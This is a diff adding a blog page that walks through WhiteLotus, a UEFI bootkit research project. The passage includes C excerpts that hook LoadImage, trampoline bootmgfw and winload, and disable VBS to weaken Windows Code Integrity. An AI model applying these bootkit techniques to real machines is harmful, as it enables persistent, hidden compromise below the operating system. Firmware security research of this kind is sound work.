@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>0xbekoo</title>
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta content="utf-8" http-equiv="encoding">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="theme-color" content="#000084" />
+    <link rel="icon" href="/favicon.ico">
+    <link rel="canonical" href="/blogs/whitelotus/">
+    <noscript><style>body { visibility: visible !important; }</style></noscript>
+</head>
+<body>
+<nav class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container">
+            <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"></button>
+            <a class="brand" href="/">0xbekoo</a>
+            <div class="nav-collapse collapse">
+                <ul class="nav">
+                    
+                    
+                        
+                            <li>
+                                <a href="/docs/">
+                                    
+                                    <span>Documentation</span>
+                                </a>
+                            </li>
+                        
+                    
+                        
+                            <li>
+                                <a href="/blogs/">
+                                    
+                                    <span>Blogs</span>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+        </div>
+    </div>
+</nav>
+<div id="content" class="container">
+
+
+
+
+
+
+
+
+
+
+    
+    
+    
+    
+    
+
+
+
+
+<article class="single-shell single-shell--blogs">
+    <div class="row-fluid navmargin">
+        <div class="page-header single-shell__header">
+            <h1 class="single-shell__title">WhiteLotus: Walking Through a UEFI Bootkit</h1>
+            <p class="single-shell__meta">Tue, May 12, 2026</p>
+        </div>
+        <div class="single-shell__body single-shell__body--with-toc">
+            <div class="single-shell__main">
+                
+                <p class="lead single-shell__lead">A firmware research walk-through of WhiteLotus, a UEFI boot-chain project that follows bootmgfw, winload, and ntoskrnl before Windows fully starts.</p>
+                
+                
+                <section class="single-shell__author single-shell__author--mobile">
+                    <div class="single-shell__author-static" aria-hidden="true"></div>
+                    <div class="single-shell__author-heading">About Author</div>
+                    <div class="single-shell__author-card">
+                        <a class="single-shell__author-photo-link" href="https://github.com/0xbekoo">
+                        <div class="single-shell__author-photo-shell">
+                            <img class="single-shell__author-photo" src="https://github.com/0xbekoo.png" alt="0xbekoo">
+                        </div>
+                        </a>
+                        <div class="single-shell__author-body">
+                            <a class="single-shell__author-name-link" href="https://github.com/0xbekoo">
+                            <span class="single-shell__author-name" data-text="0xbekoo">0xbekoo</span>
+                            </a>
+                            <p class="single-shell__author-title">Low-Level Security Researcher</p>
+                        </div>
+                    </div>
+                </section>
+                
+                
+                <section class="single-shell__toc single-shell__toc--mobile is-open" data-ui="toc">
+                    <button class="single-shell__toc-toggle" type="button" aria-expanded="true" aria-controls="single-toc-mobile-blogs-whitelotus-">
+                        <span class="single-shell__toc-label">Contents</span>
+                        <span class="single-shell__toc-status" aria-hidden="true">[-]</span>
+                    </button>
+                    <div id="single-toc-mobile-blogs-whitelotus-" class="single-shell__toc-panel">
+                        <div class="single-shell__toc-panel-inner">
+                            <div class="single-shell__toc-body">
+                                <nav id="TableOfContents-mobile">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#introduction"><strong>Introduction</strong></a></li>
+        <li><a href="#walking-into-the-boot-chain"><strong>Walking Into the Boot Chain</strong></a></li>
+        <li><a href="#the-first-hook"><strong>The First Hook</strong></a></li>
+        <li><a href="#inside-winloadefi"><strong>Inside winload.efi</strong></a></li>
+        <li><a href="#touching-ntoskrnlexe-before-it-wakes-up"><strong>Touching ntoskrnl.exe Before It Wakes Up</strong></a></li>
+        <li><a href="#the-windows-side-loader"><strong>The Windows-Side Loader</strong></a></li>
+        <li><a href="#conclusion"><strong>Conclusion</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <div class="single-shell__content">
+                    <div class="blog-callout blog-callout-warning">
+  <div class="blog-callout__header">
+    <span class="blog-callout__badge">[!]</span>
+    <span class="blog-callout__title">Research and Safety Notice</span>
+  </div>
+  <div class="blog-callout__body"><p>This post is written strictly for firmware security research and defensive understanding. WhiteLotus is a boot-chain research project; it touches the EFI System Partition, modifies UEFI boot variables such as <code>BootOrder</code> and <code>BootNext</code>, uses a Windows-side loader flow that involves privilege escalation/UAC bypass behavior, and patches boot-time Windows components to affect VBS/DSE and Code Integrity paths.</p>
+<p>Since it runs smoothly on systems without Secure Boot, please use it only in controlled environments. As the project’s developer, I have never accepted responsibility for its use in real-world scenarios, nor do I ever recommend it; these projects are intended solely for educational purposes, and the responsibility lies entirely with you.</p>
+</div>
+</div>
+
+<h3 id="introduction"><strong>Introduction</strong></h3>
+<p>Do you know BlackLotus?</p>
+<p>BlackLotus is my favorite bootkit, and, <strong>in my opinion, BlackLotus was truly unique not because of the security vulnerability it exploited, but because of its chained structure.</strong>.</p>
+<p>It was one of those projects that made people remember a very annoying truth again: the operating system is not the first thing that owns the machine. Before Windows starts breathing, there is already a whole boot world running under it.</p>
+<p>WhiteLotus got its name from there. Not because I wanted to make &ldquo;the same thing but cooler&rdquo; or something like that. The idea was more like: okay, BlackLotus showed how serious this class of attack can be, so let&rsquo;s build a research-oriented project where I can understand the boot chain with my own hands. BlackLotus was bypassing Secure Boot, while WhiteLotus, on the other hand, runs on systems without Secure Boot. Therefore, ‘WhiteLotus’ represents this.</p>
+<p>This is an honor for me (because of my love to BlackLotus xD) to explain you my WhiteLotus as a boot-chain research project. It demonstrates how the Windows boot path can be intercepted before the kernel starts. The main idea is simple to say but dangerous in practice: if we can run a DXE driver before <code>bootmgfw.efi</code>, and if we can follow the chain from <code>bootmgfw.efi</code> to <code>winload.efi</code>, then we can reach the moment where <code>ntoskrnl.exe</code> is already loaded in memory but not yet executing. But SB (Secure Boot) guards this chain.</p>
+<p>I separated the project into two parts because the firmware logic and the Windows deployment logic solve different problems. Keeping them apart makes the chain easier to reason about:</p>
+<ul>
+<li><strong>WhiteLotusDXE</strong>: the UEFI DXE driver that hooks the boot chain and performs the actual patching logic.</li>
+<li><strong>WhiteLotusEXE</strong>: the Windows-side deployment component that places the EFI payload into the EFI System Partition and prepares the next boot.</li>
+</ul>
+<h3 id="walking-into-the-boot-chain"><strong>Walking Into the Boot Chain</strong></h3>
+<p>Before going into the code, we need to place WhiteLotus on the map. In a normal UEFI Windows boot, the firmware loads the Windows Boot Manager. Then <code>bootmgfw.efi</code> loads the Windows OS loader, and <code>winload.efi</code> prepares the kernel, boot drivers, loader block, and everything else that Windows needs before the first kernel instructions run.</p>
+<p>The rough chain looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>UEFI Firmware
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>bootmgfw.efi
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>winload.efi
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>ntoskrnl.exe
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>Windows Kernel
+</span></span></code></pre></div><p>The first design question was: where should I stand in this chain?</p>
+<p>I could try to touch Windows after it boots, but then I would be fighting PatchGuard, Code Integrity, kernel callbacks, EDR logic, and the normal runtime protections. Instead, WhiteLotus stands earlier. It inserts itself before <code>bootmgfw.efi</code> and then follows the chain from the inside:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>WhiteLotusDXE
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | hooks EFI_BOOT_SERVICES-&gt;LoadImage()
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>bootmgfw.efi is loaded
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | hooks ImgArchStartBootApplication()
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>winload.efi is loaded
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | hooks OslFwpKernelSetupPhase1()
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>ntoskrnl.exe is found in LoaderBlock
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    | patches Code Integrity paths
+</span></span><span style="display:flex;"><span>    v
+</span></span><span style="display:flex;"><span>Windows continues booting
+</span></span></code></pre></div><p>This is why bootkits are uncomfortable to analyze. They do not need to fight the running kernel directly. They wait for the kernel to be present in memory, but not fully alive yet. It is like editing a creature before it wakes up.</p>
+<h3 id="the-first-hook"><strong>The First Hook</strong></h3>
+<p>The main entry point of the firmware side is <code>WhiteLotusEntryPoint()</code> in <code>WhiteLotusDXE/WhiteLotus.c</code>. The first important operation is hooking <code>LoadImage()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>OriginalLoadImageAddress <span style="color:#f92672">=</span> (EFI_IMAGE_LOAD)<span style="color:#a6e22e">HookServicePointer</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>gBS<span style="color:#f92672">-&gt;</span>Hdr,
+</span></span><span style="display:flex;"><span>    (VOID <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>gBS<span style="color:#f92672">-&gt;</span>LoadImage,
+</span></span><span style="display:flex;"><span>    (VOID <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>HookedLoadImage
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p><code>gBS</code> is the UEFI Boot Services table. During boot services time, firmware components can use this table for things like loading images, allocating memory, opening protocols, reading filesystems, and starting images. By replacing the <code>LoadImage</code> function pointer, WhiteLotus gets a callback whenever firmware loads a new EFI image.</p>
+<p>This is the first reason I picked <code>LoadImage()</code>. I did not want to hardcode the exact moment where <code>bootmgfw.efi</code> appears. Firmware already has enough platform-specific behavior, and if you add hardcoded assumptions everywhere, debugging becomes unnecessarily painful. With this hook, WhiteLotus simply stands next to the loader door and watches every image passing through.</p>
+<p>The hook is installed with <code>HookServicePointer()</code>. Before writing into the service table, the code raises TPL and temporarily clears <code>CR0.WP</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CONST EFI_TPL Tpl <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">RaiseTPL</span>(TPL_HIGH_LEVEL);
+</span></span><span style="display:flex;"><span>CONST UINTN Cr0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">AsmReadCr0</span>();
+</span></span><span style="display:flex;"><span>CONST BOOLEAN WpSet <span style="color:#f92672">=</span> (Cr0 <span style="color:#f92672">&amp;</span> CR0_WP) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (WpSet) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">AsmWriteCr0</span>(Cr0 <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>CR0_WP);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This should look familiar if you have touched kernel patching before. <code>CR0.WP</code> is the Write Protect bit. If it is set, supervisor-mode code is also prevented from writing to read-only pages. Clearing it creates a small write window. After the pointer replacement, WhiteLotus recalculates the UEFI table CRC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ServiceTableHeader<span style="color:#f92672">-&gt;</span>CRC32 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">CalculateCrc32</span>(
+</span></span><span style="display:flex;"><span>    (UINT8<span style="color:#f92672">*</span>)ServiceTableHeader,
+</span></span><span style="display:flex;"><span>    ServiceTableHeader<span style="color:#f92672">-&gt;</span>HeaderSize,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>ServiceTableHeader<span style="color:#f92672">-&gt;</span>CRC32
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>That CRC update matters because UEFI tables are not just random structs. They have headers, revisions, sizes, and checksums. If you patch one and leave the checksum stale, the firmware ecosystem can become very noisy very quickly.</p>
+<p>WhiteLotus also hooks <code>SetVariable()</code> from Runtime Services:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>OriginalSetVariableAddress <span style="color:#f92672">=</span> (EFI_SET_VARIABLE)<span style="color:#a6e22e">SetRuntimeServicePointer</span>(
+</span></span><span style="display:flex;"><span>    (VOID <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>gRT<span style="color:#f92672">-&gt;</span>SetVariable,
+</span></span><span style="display:flex;"><span>    (VOID <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>HookedSetVariable
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>This is a second layer of control. <code>SetVariable()</code> is used to write UEFI variables. The project currently filters a variable called <code>TestData</code>, but the more general idea is clear: a runtime service hook can observe, block, or alter NVRAM writes later in the boot lifetime.</p>
+<p>After the hooks are installed, WhiteLotus searches all mounted simple filesystems for the Windows Boot Manager:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CHAR16 <span style="color:#f92672">*</span>BootMgrPath <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">EFI</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Microsoft</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Boot</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">bootmgfw.efi&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">LocateHandleBuffer</span>(
+</span></span><span style="display:flex;"><span>    ByProtocol,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>gEfiSimpleFileSystemProtocolGuid,
+</span></span><span style="display:flex;"><span>    NULL,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>HandleCount,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>HandleBuffer
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>I did it this way because device paths are not something I want to trust blindly between machines. The ESP can appear through different handles, disk layouts can change, and firmware implementations are not always consistent. So WhiteLotus opens every volume and tries to find <code>\EFI\Microsoft\Boot\bootmgfw.efi</code> instead of assuming where it lives.</p>
+<p>When the correct partition is found, the code builds a device path and loads the Windows Boot Manager manually:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>DevicePath <span style="color:#f92672">=</span> <span style="color:#a6e22e">FileDevicePath</span>(TargetDeviceHandle, BootMgrPath);
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">LoadImage</span>(FALSE, ImageHandle, DevicePath, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>NewImageHandle);
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gBS<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">StartImage</span>(NewImageHandle, NULL, NULL);
+</span></span></code></pre></div><p>At this point the trap is already set. <code>LoadImage()</code> is hooked, so when <code>bootmgfw.efi</code> is loaded, WhiteLotus can inspect the image and decide whether it is interesting.</p>
+<p>Before touching anything, WhiteLotus needs to understand what it just loaded. This recognition part lives mostly inside <code>PE.c</code>. The project parses PE headers and classifies loaded images with <code>GetInputFileType()</code>.</p>
+<p>For <code>bootmgfw.efi</code>, the project checks the PE subsystem and searches for the Windows Boot Manager BCD GUID:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CONST EFI_GUID BcdWindowsBootmgrGuid <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x9dea862c</span>, <span style="color:#ae81ff">0x5cdd</span>, <span style="color:#ae81ff">0x4e70</span>,
+</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x95</span> }
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>For <code>winload.efi</code>, the code looks for <code>OSLOADER.XSL</code> in the resource data. I liked this detail because it avoids relying only on filenames. In boot-time memory, filenames are not always the most stable source of truth. The loaded image itself tells us what it is.</p>
+<p>So the logic becomes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PE image loaded
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    +-- Native subsystem              -&gt; ntoskrnl.exe
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    +-- EFI application + Bootmgr GUID -&gt; bootmgfw.efi
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    +-- Boot application + OSLOADER    -&gt; winload.efi
+</span></span><span style="display:flex;"><span>    |
+</span></span><span style="display:flex;"><span>    +-- anything else                  -&gt; ignore
+</span></span></code></pre></div><p>This part is important because a bootkit that patches the wrong image is not a bootkit anymore. It is just a very expensive crash generator.</p>
+<p>Once <code>bootmgfw.efi</code> is detected, WhiteLotus calls <code>PatchBootMgfw()</code>.</p>
+<p>The target function is <code>ImgArchStartBootApplication</code> or, on older builds, <code>ImgArchEfiStartBootApplication</code>. I chose this point because <code>bootmgfw.efi</code> uses it when starting a boot application. In our case, the boot application we care about is <code>winload.efi</code>.</p>
+<p>WhiteLotus finds the function with a byte signature:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>STATIC CONST UINT8 SigImgArchStartBootApplication[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xD0</span>
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>After finding the signature, it walks back to the function start with <code>FindFunctionStart()</code>. Then it writes a tiny trampoline over the beginning of the function.</p>
+<p>The hook template is small and direct:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CONST UINT8 gHookTemplate[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xB8</span>,                                     <span style="color:#75715e">// mov rax, &lt;imm64&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x50</span>,                                           <span style="color:#75715e">// push rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xC3</span>                                            <span style="color:#75715e">// ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>In x64 terms, this is basically:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">HookAddress</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ret</span>
+</span></span></code></pre></div><p>It is a compact absolute jump. The original bytes are saved before patching:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">CopyMem</span>(BackupAddress, (VOID<span style="color:#f92672">*</span>)OriginalAddress, <span style="color:#66d9ef">sizeof</span>(gHookTemplate));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CopyWpMem</span>((VOID<span style="color:#f92672">*</span>)OriginalAddress, gHookTemplate, <span style="color:#66d9ef">sizeof</span>(gHookTemplate));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CopyWpMem</span>(
+</span></span><span style="display:flex;"><span>    (UINT8<span style="color:#f92672">*</span>)OriginalAddress <span style="color:#f92672">+</span> gHookTemplateAddressOffset,
+</span></span><span style="display:flex;"><span>    (UINTN<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>HookAddress,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(UINTN)
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>Then <code>HookedBootmgrImgArchStartBootApplication_Eight()</code> becomes the middleman. When <code>bootmgfw.efi</code> starts a boot application, the hook checks whether the image is <code>winload.efi</code>. If it is, WhiteLotus calls <code>PatchWinload()</code>.</p>
+<p>There is a small elegance here: the hook restores the original function bytes before calling the real function again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">CopyWpMem</span>(OriginalFunction, OriginalFunctionBytes, <span style="color:#66d9ef">sizeof</span>(gHookTemplate));
+</span></span></code></pre></div><p>So the boot flow continues. WhiteLotus only borrows execution for a moment, changes what it needs, and then steps out of the way. This was important for me because I did not want the boot chain to look like a broken lab experiment. The cleaner the handoff, the easier it is to understand what actually failed when something goes wrong.</p>
+<h3 id="inside-winloadefi"><strong>Inside winload.efi</strong></h3>
+<p><code>winload.efi</code> is where things become more interesting. At this stage, Windows is still not fully running, but the loader has enough information about the kernel image and boot modules.</p>
+<p>WhiteLotus targets <code>OslFwpKernelSetupPhase1()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>STATIC CONST UINT8 SigOslFwpKernelSetupPhase1[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0xCC</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xCC</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0xCC</span>
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>The function is found by scanning the <code>.text</code> section. Then the same trampoline idea is used again:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">CopyMem</span>(
+</span></span><span style="display:flex;"><span>    gOslFwpKernelSetupPhase1Backup,
+</span></span><span style="display:flex;"><span>    (VOID<span style="color:#f92672">*</span>)gOriginalOslFwpKernelSetupPhase1,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(gHookTemplate)
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CopyWpMem</span>(
+</span></span><span style="display:flex;"><span>    (VOID<span style="color:#f92672">*</span>)gOriginalOslFwpKernelSetupPhase1,
+</span></span><span style="display:flex;"><span>    gHookTemplate,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(gHookTemplate)
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>I did not pick this function randomly. The reason is that the hook receives a <code>LOADER_PARAMETER_BLOCK</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EFI_STATUS EFIAPI <span style="color:#a6e22e">HookedOslFwpKernelSetupPhase1</span>(
+</span></span><span style="display:flex;"><span>    IN PLOADER_PARAMETER_BLOCK LoaderBlock
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div><p>This structure is gold. It contains the loader&rsquo;s view of the boot world, including the loaded module list. At this point I do not need to blindly scan memory and hope I find the right image. The loader already has the list. WhiteLotus walks <code>LoadOrderListHead</code> and searches for <code>ntoskrnl.exe</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>CONST PKLDR_DATA_TABLE_ENTRY KernelEntry <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">GetBootLoadedModule</span>(
+</span></span><span style="display:flex;"><span>        (LIST_ENTRY<span style="color:#f92672">*</span>)LoadOrderListHeadAddress,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntoskrnl.exe&#34;</span>
+</span></span><span style="display:flex;"><span>    );
+</span></span></code></pre></div><p>If the kernel entry is found, the project now has:</p>
+<ul>
+<li><code>KernelEntry-&gt;DllBase</code>: where <code>ntoskrnl.exe</code> is loaded.</li>
+<li><code>KernelEntry-&gt;SizeOfImage</code>: how large the kernel image is.</li>
+<li>PE headers: enough structure to scan sections and imports.</li>
+</ul>
+<p>This is the central moment of the project. WhiteLotus does not patch a kernel file on disk. It patches the loaded kernel image in memory during boot.</p>
+<p>Before the kernel patching stage, WhiteLotus also sets the <code>VbsPolicyDisabled</code> EFI variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> gRT<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SetVariable</span>(
+</span></span><span style="display:flex;"><span>    (CHAR16<span style="color:#f92672">*</span>)VbsPolicyDisabledVariableName,
+</span></span><span style="display:flex;"><span>    (EFI_GUID<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>MicrosoftVendorGuid,
+</span></span><span style="display:flex;"><span>    EFI_VARIABLE_NON_VOLATILE <span style="color:#f92672">|</span> EFI_VARIABLE_BOOTSERVICE_ACCESS,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(Disabled),
+</span></span><span style="display:flex;"><span>    (BOOLEAN<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Disabled
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>This part exists because VBS changes the trust boundaries around code integrity. If the system boots with VBS-based protections active, the old &ldquo;patch the kernel memory and continue&rdquo; model becomes much less reliable. So before trying to bend Code Integrity, WhiteLotus also tries to make the boot environment less hostile to that research path.</p>
+<p>In other words, WhiteLotus is not only touching code integrity. It also tries to shape the environment around code integrity.</p>
